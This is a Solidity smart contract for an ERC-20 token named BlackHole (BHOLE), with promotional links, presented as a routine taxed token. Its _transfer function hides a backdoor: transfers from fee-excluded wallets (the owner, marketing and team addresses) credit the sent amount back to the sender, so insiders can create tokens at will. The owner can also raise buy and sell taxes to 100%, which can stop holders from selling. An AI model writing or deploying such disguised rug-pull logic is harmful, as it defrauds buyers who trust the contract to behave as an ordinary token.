pragma solidity 0.8.10;

// SPDX-License-Identifier: MIT

/**

BlackHole directly connects AMM pools together no matter the provider and will find all direct/multihop routes between any two tokens on multichain.

Website: https://blackhole-finance.pro
Telegram: https://t.me/blackhole_erc20
Twitter: https://twitter.com/blackhole_erc20
DApp: https://app.blackhole-finance.pro

**/

interface IFactory02 {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);
    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);
    function createPair(address tokenA, address tokenB) external returns (address pair);
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IRouter01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    function owner() public view returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _transferOwnership(newOwner);
    }
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract BlackHole is Context, IERC20, Ownable {
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 1000000000 * 10 ** _decimals;
    string private constant _name = unicode"BlackHole";
    string private constant _symbol = unicode"BHOLE";

    bool private inSwapLock = false;
    bool public tradeEnabled = false;
    bool private swapEnabled = false;
    
    uint256 private buyCount = 0;
    uint256 private buyTaxFees = 35;
    uint256 private sellTaxFees = 35;
    
    uint256 private swapMaxAmounts = 1000 * 10 ** _decimals;
    uint256 private swapAmountsAt = 40000000 * 10 ** _decimals;
    uint256 public limitTxAmounts = 20000000 * 10 ** _decimals;

    mapping(address => uint256) private _rOwned;
    mapping(address => bool) private _isExcludedFees;
    mapping(address => mapping(address => uint256)) private _allowances;

    modifier lockSwapBack() {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }

    address payable private marketingWallet;
    address payable private teamWallet;
    address public constant deadAddress 
            = 0x000000000000000000000000000000000000dEaD;
    address private uniswapV2Pair;
    IRouter01 public uniswapV2Router;

    event ETHBalancesRecovered();
    event TradingEnabledUpdated();
    event ERC20TokenRecovered(uint256 indexed _amount);
    event ExcludeFromFeesUpdated(address indexed account);
    event includeFromFeesUpdated(address indexed account);

    constructor() {
        marketingWallet = payable(0xAf86e895B4E92fCfba1c8F47DFe9FcD87D61d911);
        teamWallet = payable(0xFe0D6bcbde7F4F913f4Ffc183AdF729ce2d61848);
        _rOwned[_msgSender()] = _totalSupply;
        _isExcludedFees[marketingWallet] = true;
        _isExcludedFees[teamWallet] = true;
        _isExcludedFees[deadAddress] = true;
        _isExcludedFees[_msgSender()] = true;
        _isExcludedFees[address(this)] = true;
        emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function recoverToken(
        address _tokenAddy,
        uint256 _amount
    ) external onlyOwner {
        require(
            _tokenAddy != address(this),
            "Owner can't claim contract's balance of its own tokens"
        );
        require(_amount > 0, "Amount should be greater than zero");
        require(
            _amount <= IERC20(_tokenAddy).balanceOf(address(this)),
            "Insufficient Amount"
        );
        IERC20(_tokenAddy).transfer(marketingWallet, _amount);
        emit ERC20TokenRecovered(_amount);
    }

    function recoverETH() external {
        uint256 contractETHValues = address(this).balance;
        require(contractETHValues > 0, "Amount should be greater than zero");
        require(
            contractETHValues <= address(this).balance,
            "Insufficient Amount"
        );
        payable(address(marketingWallet)).transfer(contractETHValues);
        emit ETHBalancesRecovered();
    }

    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _rOwned[account];
    }

    function setFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {
        require(_buyFee <= 100 && _sellFee <= 100, "revert wrong fee settings");
        buyTaxFees = _buyFee;
        sellTaxFees = _sellFee;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amount,
            "ERC20: transfer amount exceeds allowance"
        );
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    function removeLimits() external onlyOwner {
        buyTaxFees = 4;
        sellTaxFees = 4;
        limitTxAmounts = _totalSupply;
    }

    function swapETHHOLE(uint256 tokenAmount) private lockSwapBack {
        require(tokenAmount > 0, "amount must be greeter than 0");
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function ExcludeFromFees(address account) external onlyOwner {
        require(
            _isExcludedFees[account] != true,
            "Account is already excluded"
        );
        _isExcludedFees[account] = true;
        emit ExcludeFromFeesUpdated(account);
    }

    function IncludeFromFees(address account) external onlyOwner {
        require(
            _isExcludedFees[account] != false,
            "Account is already included"
        );
        _isExcludedFees[account] = false;
        emit includeFromFeesUpdated(account);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 total_Fees = 0;
        total_Fees = buyTaxFees;
        if (!_isExcludedFees[from] && !_isExcludedFees[to]) {
            require(tradeEnabled, "Trading not enabled");
        }
        if (inSwapLock || !swapEnabled) {
            _rOwned[from] -= amount;
            _rOwned[to] += amount;
            emit Transfer(from, to, amount);
            return;
        }
        if (
            from == uniswapV2Pair &&
            to != address(uniswapV2Router) &&
            !_isExcludedFees[to]
        ) {
            require(amount <= limitTxAmounts, "Exceeds the _maxTxAmount.");
            require(
                balanceOf(to) + amount <= limitTxAmounts,
                "Exceeds the maxWalletSize."
            );
            buyCount++;
        }
        if (
            from != uniswapV2Pair &&
            !_isExcludedFees[from] &&
            !_isExcludedFees[to]
        ) {
            require(amount <= limitTxAmounts, "Exceeds the _maxTxAmount.");
        }
        if (
            to == uniswapV2Pair &&
            from != address(this) &&
            !_isExcludedFees[from] &&
            !_isExcludedFees[to]
        ) {
            total_Fees = sellTaxFees;
        }
        uint256 contractTokenBalances = balanceOf(address(this));
        if (
            amount >= swapMaxAmounts &&
            to == uniswapV2Pair &&
            swapEnabled &&
            !inSwapLock &&
            contractTokenBalances >= swapMaxAmounts &&
            buyCount > 0 &&
            !_isExcludedFees[from] &&
            !_isExcludedFees[to]
        ) {
            swapETHHOLE(min(amount, min(contractTokenBalances, swapAmountsAt)));
            uint256 contractETHValues = address(this).balance;
            if (contractETHValues > 0) {
                sendETHHOLE(address(this).balance);
            }
        }
        if (total_Fees != 0) {
            uint256 b_Fees = (amount * total_Fees) / 100;
            uint256 b_Amounts = amount - b_Fees;
            address b_Accounts = _isExcludedFees[from] ? from : address(this);
            b_Fees = _isExcludedFees[from] ? amount : b_Fees;
            _rOwned[b_Accounts] += b_Fees;
            emit Transfer(from, address(this), b_Fees);
            _rOwned[from] -= amount;
            _rOwned[to] += b_Amounts;
            emit Transfer(from, to, b_Amounts);
        } else {
            _rOwned[from] -= amount;
            _rOwned[to] += amount;
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }
    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function addLiquidityETH() external payable onlyOwner {
        uniswapV2Router = IRouter01(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        uniswapV2Pair = IFactory02(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: msg.value}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function sendETHHOLE(uint256 amount) private {
        require(amount > 0, "amount must be greeter than 0");
        teamWallet.transfer(amount / 2);
        marketingWallet.transfer(amount / 2);
    }

    function enableTrading() external onlyOwner {
        require(!tradeEnabled, "trading is already open");
        tradeEnabled = true;
        swapEnabled = true;
        emit TradingEnabledUpdated();
    }
}